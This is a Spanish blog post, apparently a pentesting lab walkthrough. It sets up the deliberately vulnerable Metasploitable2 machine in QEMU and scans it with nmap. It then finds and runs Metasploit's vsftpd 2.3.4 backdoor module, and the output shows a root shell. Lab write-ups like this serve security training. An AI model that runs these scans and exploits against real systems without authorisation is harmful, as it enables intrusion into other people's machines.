---
title: Metasploitable2 en Qemu
date: 2025-07-15 19:00:00 +0200
categories: [hacking]
tags: [metasploitable2, qemu]     
image:
    path: https://upload.wikimedia.org/wikipedia/commons/9/9f/ARP_Cache_Poisoning.jpg 
    alt: 
---

## Descargar 
Metasploitable2 es una de las máquinas que ofrece Rapid7 para realizar prácticas de pentesting. 
La descarga es un fichero zip que contien los ficheros para hacer que la máquina en VirtualBox.Puedes descargar la máquina desde aquí:
[https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download)

Es una máquina Linux con "vulnerabilidades" en [Hacktools/#vulnerable-machines](../hacktools/#vulnerable-machines) puedes encontrar más máquinas y proyectos como este. Incluye varios proyectos web con vulnerabilidades o con versiones vulnerables para practicar todo tipo de pruebas de penetración como TWiki, phpMyAdmin, Mutillidae, DVWA, WebDAV, aparte de las propias vulnerabilidades del sistema que sostienen esas web, la máquina virtual en si misma. 


Instala qemu-utils si no lo tienes:

``` shell
sudo apt install qemu-utils
```

## Conversión a QEMU
Como no me gusta instalar 20 tipos de sistemas de virtualización en mi máquina opté por convertir la imagen VMDK a QCOW2, de otra forma necesitaría instalar VirtualBox, pero podemos sortear este "inconveniente":

``` shell
qemu-img convert -f vmdk -O qcow2 Metasploitable.vmdk metasploitable2.qcow2
```

## Configuración red puente
Crear una conexión puente para poder comunicarnos con esta máquina remplaza **vmbridge** con el nombre de su interface de red puente. Usamos la opción bridge para usar un dispostivo virtual bridge, ver => [bridged-linux](../bridges-linux)

Ahora podemos lanzar la máquina, recuerda que para salir de la ventana en QEMU tenemos esta combinación de teclas "Ctrl + Alt + G" . 

Además hay que modificar el fichro /etc/qemu/bridge.conf si queremos que nuestro Qemu acepte usar ese puente. 

``` shell
allow vmbridge
```

## Metasploitables en QEMU
Lanzamos la imagen así, podemos cambiar los parámetros de memoria pero 2048 parece que es más que suficiente.

``` shell
sudo qemu-system-i386 -hda metasploitable2.qcow2 -m 2048 -net bridge,br=vmbridge
```
Ahora comprueba que tengas conectividad, con la VM, puedes comprobarlo haciendo ping u otra herramienta. 
Por ejemplo el navegador

Primer contacto web:
``` html

                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


    TWiki
    phpMyAdmin
    Mutillidae
    DVWA
    WebDAV
```
## Fase de reconocimiento
Escaneo Nmap:

``` shell
root@office:/home/pablo# nmap -p- -sV 192.168.2.225 -vv
....
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 64 vsftpd 2.3.4
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      syn-ack ttl 64 Linux telnetd
25/tcp    open  smtp        syn-ack ttl 64 Postfix smtpd
53/tcp    open  domain      syn-ack ttl 64 ISC BIND 9.4.2
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        syn-ack ttl 64 netkit-rsh rexecd
513/tcp   open  login?      syn-ack ttl 64
514/tcp   open  shell       syn-ack ttl 64 Netkit rshd
1099/tcp  open  java-rmi    syn-ack ttl 64 GNU Classpath grmiregistry
1524/tcp  open  bindshell   syn-ack ttl 64 Metasploitable root shell
2049/tcp  open  nfs         syn-ack ttl 64 2-4 (RPC #100003)
2121/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.3.1
3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     syn-ack ttl 64 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  syn-ack ttl 64 PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         syn-ack ttl 64 VNC (protocol 3.3)
6000/tcp  open  X11         syn-ack ttl 64 (access denied)
6667/tcp  open  irc         syn-ack ttl 64 UnrealIRCd
6697/tcp  open  irc         syn-ack ttl 64 UnrealIRCd
8009/tcp  open  ajp13?      syn-ack ttl 64
8180/tcp  open  unknown     syn-ack ttl 64
8787/tcp  open  drb         syn-ack ttl 64 Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
41015/tcp open  java-rmi    syn-ack ttl 64 GNU Classpath grmiregistry
51073/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)
55206/tcp open  nlockmgr    syn-ack ttl 64 1-4 (RPC #100021)
56510/tcp open  status      syn-ack ttl 64 1 (RPC #100024)

```
Para hacer más rápido un búsqueda de posibles exploits ahora que conocemos los puertos. 

21/tcp    open  ftp         syn-ack ttl 64 vsftpd 2.3.4

## Fase de preparación
``` shell
root@office:/home/pablo# searchsploit vsftpd
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                                   | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                                   | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                                   | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                                                 | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                                          | multiple/remote/49719.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Ahora desde Metasploit, podemos buscar el exploit que podríamos utilizar
``` shell
msf6 > search vsft

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
                                       ing-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.2.225
rhost => 192.168.2.225
```

## Explotación
Lanzamos el exploit y tenemos root shell. 

``` shell
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.2.225:21 - The port used by the backdoor bind listener is already open
[+] 192.168.2.225:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.122.15:46433 -> 192.168.2.225:6200) at 2025-07-17 14:38:47 -0400

whoami
root

```

Hay varias formas de explotar esta máquina y Internet está lleno de manuales para explotarlas, busca la que más te apetezca o invéntate una.
